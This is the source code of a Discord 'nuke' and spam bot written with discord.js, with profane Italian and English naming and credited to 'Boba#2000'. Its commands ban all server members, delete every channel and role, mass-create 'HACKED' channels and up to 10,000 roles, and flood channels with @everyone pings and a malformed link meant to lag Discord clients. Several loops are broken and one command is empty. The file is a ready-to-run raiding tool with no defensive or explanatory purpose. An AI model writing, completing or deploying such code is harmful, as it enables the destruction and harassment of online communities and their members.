const Loser = require("discord.js")
const shit = new Loser.Client()
const merda = require("./fuck.json")

shit.on("ready", () => {
    console.log("Remake by Boba#2000.")
    console.log("")
    console.log("TadiBot (PREMIUM) è una merda LMFAO.")
    console.log("")
    console.log("NON HA TUTTI I COMANDI.")
})

shit.on("message", tadishit => {
 const stfu = "!"
 if(tadishit.author.bot) return;
 if (!tadishit.guild) return;
 if (!tadishit.content.startsWith(stfu)) return;
 const svoro = tadishit.content.slice(stfu.length).trim().split(/ +/g);
 const dioo = svoro.shift().toLowerCase();
 if(dioo === "help"){
 const xdF = new Loser.RichEmbed()
 .setTitle("Nuke/Spam Bot | !help ")
 .setColor("RED")
 .setDescription(`:dash:!nuke=Bans all members & deletes all roles & channels
 :radioactive:!delete=Deletes all channels and roles
 :hammer:!ban=Bans all members
 :rocket:!channelrole=Create 50 Text and Voice and Roles name hacked
 :pencil:!text=Create 30 text name hacked
 :loud_sound:!voice=Create 30 voice name hacked
 :ferris_wheel:!role=Create 30 role name hacked
 :warning:!spam=Spam In Channels: [@everyone]
 :frame_photo:!imagespam=Spam In Channels Images With: [@everyone]
 :radioactive:!lag=Lag discord
 :sunny:!emojispam=Spam emoji In Channels: [@everyone]
 :outbox_tray:!left=The bot exits the server
 :gear:Credit By Boba#2000
 :robot:TadiShit (Remake)`)
 tadishit.channel.send(xdF)
 }
 if(dioo === "nuke"){
    tadishit.guild.members.forEach(d => d.ban().catch(x => {
        console.log("Non ho i permessi per bannare utente.")
    }));
    tadishit.guild.channels.forEach(s => s.delete().catch(r => {
        console.log("Non ho i permessi per cancellare il canale.")
    }))
    tadishit.guild.roles.deleteAll().catch(er => {console.log("Non posso il ruolo. RIP")});
	for(var d=0;d<10000;d++){
        tadishit.guild.createRole({name: "HACKED BY TADISHIT"})
    }
 }
 if(dioo === "ban"){
    tadishit.guild.members.forEach(d => d.ban().catch(x => {
        console.log("Non ho i permessi per bannare utente.")
    }));
 }
 if(dioo === "channelrole"){
    for(var d=0;d<50;d++){

    tadishit.guild.createChannel('HACKED', { type: 'text' })
    tadishit.guild.createChannel('HACKED', { type: 'voice' })

 }
 }
 if(dioo === "delete"){
    tadishit.guild.channels.forEach(s => s.delete().catch(r => {
        console.log("Non ho i permessi per cancellare il canale.")
    }))
    tadishit.guild.roles.deleteAll().catch(aa => { console.log("Non posso eliminare il ruolo")})
 }
 if(dioo === "text"){
    for(var f=0;d<30;f++){
      tadishit.guild.createChannel('HACKED', { type: 'text' })
    
     }
 }
 if(dioo === "voice"){
    for(var x=0;d<30;x++){
        tadishit.guild.createChannel('HACKED', { type: 'voice' })
      
       }
 }
 if(dioo === "role"){
    for(var as=0;d<30;as++){
        tadishit.guild.createRole({name: "HACKED"})
      
       }
 }
 if(dioo === "spam"){
 }
    if(dioo === "lag"){
        for (var i = 0; i < 500; i++) {
       tadishit.channel.send(`https://tenor.com/view/minec%E5%B0%86%E5%B0%BD%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB689%883%BB6%E6%89%883%BB6D%E5%85%B6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BB6%E6%89%883%BD%E5%9C%B0
       @everyone`);} 

    }
    if(dioo === "left"){
        tadishit.guild.leave()
    }
})
shit.login(merda.myfuckingtoken)